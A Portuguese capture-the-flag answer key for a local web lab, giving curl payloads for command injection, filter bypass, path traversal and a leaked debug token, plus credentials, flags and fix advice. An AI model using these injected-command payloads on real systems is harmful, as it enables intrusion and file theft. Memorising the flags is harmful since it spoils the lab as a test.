# Solution - Lab 03 NetAudit

Gabarito tecnico completo. Use apenas no ambiente local autorizado:

```text
http://127.0.0.1:8090
```

## Login

```bash
curl -s -c cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"analyst","password":"analyst123"}' \
  http://127.0.0.1:8090/api/auth/login
```

Credenciais:

```text
analyst:analyst123
admin:netaudit_admin_2026
```

O usuario admin existe no codigo, mas nao e necessario para o fluxo principal.

## 1. Command Injection em check de host

Endpoint usado pela UI:

```text
POST /api/tools/check
```

Prova de execucao:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; whoami"}' \
  http://127.0.0.1:8090/api/tools/check
```

Leitura da flag:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /app/flags/flag1.txt"}' \
  http://127.0.0.1:8090/api/tools/check
```

Flag:

```text
FLAG{command_injection_ping_lab3}
```

Causa raiz: `child_process.exec` executa uma string montada com input do usuario:

```text
ping -c 2 ${host}
```

Correcoes recomendadas:

- nao usar `exec` com concatenacao;
- usar `execFile` ou `spawn` com argumentos separados;
- validar host/IP por allowlist;
- nao tentar corrigir apenas bloqueando caracteres;
- separar permissoes do processo da aplicacao;
- em ambiente real, nao armazenar flags ou segredos acessiveis pelo processo web.

Observacao de validacao: a resposta de prova com `whoami` deve mostrar execucao de comando, mas nao deve conter `FLAG{}`. A flag so aparece quando o aluno le explicitamente o arquivo.

## 2. Resolver legado com filtro fraco

Descoberta: `public/js/app.js` contem:

```js
const legacyResolverEndpoint = "/api/tools/resolve";
```

Endpoint:

```text
POST /api/tools/resolve
```

Entrada normal:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost"}' \
  http://127.0.0.1:8090/api/tools/resolve
```

Payload bloqueado:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost; whoami"}' \
  http://127.0.0.1:8090/api/tools/resolve
```

Bypass:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost && id"}' \
  http://127.0.0.1:8090/api/tools/resolve
```

Leitura da flag:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost && cat /app/flags/flag2.txt"}' \
  http://127.0.0.1:8090/api/tools/resolve
```

Alternativa com pipe:

```bash
curl -s -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"localhost | cat /app/flags/flag2.txt"}' \
  http://127.0.0.1:8090/api/tools/resolve
```

Flag:

```text
FLAG{weak_filter_bypass_lab3}
```

Causa raiz: o backend bloqueia apenas `;`, mas ainda executa `nslookup ${host}` via shell.

Correcoes recomendadas:

- blacklist de metacaracteres nao e suficiente;
- usar `execFile("nslookup", [host])` ou `spawn` com argumentos separados;
- validar formato por allowlist;
- remover dependencia de shell para operacoes de rede;
- executar a aplicacao com privilegios minimos.

Observacao de validacao: `localhost && id` deve provar bypass sem retornar flag automaticamente.

## 3. Descoberta do support panel

Pistas:

```html
<!-- support diagnostics moved to /support.html after incident NT-2026-041 -->
```

```js
const supportDiagnostics = "/support.html";
```

Pagina escondida:

```text
/support.html
```

Ela chama:

```text
GET /api/support/log?file=app.log
```

Leitura de log normal:

```bash
curl -s -b cookies.txt \
  "http://127.0.0.1:8090/api/support/log?file=app.log"
```

Pistas vazadas em `app.log`:

```text
support health endpoint moved to /api/internal/health
header expected: X-Support-Token
support token prefix: netaudit
support token middle: debug
support token suffix: 2026
backup route only exposed by internal healthcheck
archived incident evidence moved outside data directory
legacy resolver endpoint kept for support troubleshooting
```

Token reconstruido:

```text
netaudit-debug-2026
```

Causa raiz: logs operacionais expostos para usuario autenticado comum vazam nomes de endpoint, header e segredo reconstruivel.

Correcoes recomendadas:

- nao registrar segredos;
- mascarar dados sensiveis;
- restringir logs a papeis autorizados;
- separar logs de suporte da interface comum;
- rotacionar qualquer token que tenha aparecido em log.

## 4. Information Disclosure e Path Traversal

Endpoint vulneravel:

```text
GET /api/support/log?file=...
```

Flag3 via traversal:

```bash
curl -s -b cookies.txt \
  "http://127.0.0.1:8090/api/support/log?file=../flags/flag3.txt"
```

Flag:

```text
FLAG{logs_leaking_sensitive_info_lab3}
```

Flag4 via traversal:

```bash
curl -s -b cookies.txt \
  "http://127.0.0.1:8090/api/support/log?file=../flags/flag4.txt"
```

Flag:

```text
FLAG{path_traversal_log_viewer_lab3}
```

Causa raiz: o backend usa `path.join("/app/data", file)` sem validar se o caminho final permanece em `/app/data`.

Correcoes recomendadas:

- usar allowlist de arquivos;
- normalizar o caminho com `path.resolve`;
- verificar se o caminho final permanece dentro do diretorio permitido;
- nao aceitar caminho arbitrario do usuario;
- retornar erros genericos sem expor estrutura interna.

## 5. Internal health com Broken Access Control

Endpoint:

```text
GET /api/internal/health
```

Header:

```text
X-Support-Token: netaudit-debug-2026
```

Curl:

```bash
curl -s \
  -H "X-Support-Token: netaudit-debug-2026" \
  http://127.0.0.1:8090/api/internal/health
```

Resposta esperada contem:

```json
{
  "status": "healthy",
  "service": "NetAudit",
  "environment": "production",
  "backupEndpoint": "/api/internal/backup",
  "method": "POST",
  "requiredParameter": "archiveName",
  "diagnosticFile": "/app/flags/flag5.txt"
}
```

Flag5 nao e retornada diretamente aqui. O endpoint apenas revela o arquivo diagnostico.

Causa raiz: rota interna confia em token estatico vazado e nao exige sessao de admin/autorizacao real.

Correcoes recomendadas:

- nao usar token estatico de debug;
- nao vazar token em logs;
- remover endpoints internos em producao;
- exigir autenticacao e autorizacao reais;
- segregar rotas administrativas;
- rotacionar segredos vazados.

## 6. Backup command injection

Endpoint:

```text
POST /api/internal/backup
```

Header:

```text
X-Support-Token: netaudit-debug-2026
```

Entrada normal:

```bash
curl -s \
  -H "Content-Type: application/json" \
  -H "X-Support-Token: netaudit-debug-2026" \
  -d '{"archiveName":"backup.tar.gz"}' \
  http://127.0.0.1:8090/api/internal/backup
```

Ler flag5:

```bash
curl -s \
  -H "Content-Type: application/json" \
  -H "X-Support-Token: netaudit-debug-2026" \
  -d '{"archiveName":"backup.tar.gz; cat /app/flags/flag5.txt"}' \
  http://127.0.0.1:8090/api/internal/backup
```

Flag:

```text
FLAG{admin_route_exposed_by_debug_token}
```

Ler flag final:

```bash
curl -s \
  -H "Content-Type: application/json" \
  -H "X-Support-Token: netaudit-debug-2026" \
  -d '{"archiveName":"backup.tar.gz; cat /app/flags/root.txt"}' \
  http://127.0.0.1:8090/api/internal/backup
```

Flag final:

```text
FLAG{admin_backup_command_injection_lab3}
```

Causa raiz: `archiveName` e concatenado em:

```text
tar -czf /tmp/${archiveName} /app/data
```

Correcoes recomendadas:

- gerar nome de arquivo no servidor;
- validar por allowlist;
- usar `spawn` ou `execFile` com argumentos separados;
- nunca permitir que input controle uma linha de shell;
- separar permissoes do processo que executa backup;
- nao manter segredos legiveis pelo processo web em ambiente real.

## Lista de flags

```text
FLAG{command_injection_ping_lab3}
FLAG{weak_filter_bypass_lab3}
FLAG{logs_leaking_sensitive_info_lab3}
FLAG{path_traversal_log_viewer_lab3}
FLAG{admin_route_exposed_by_debug_token}
FLAG{admin_backup_command_injection_lab3}
```
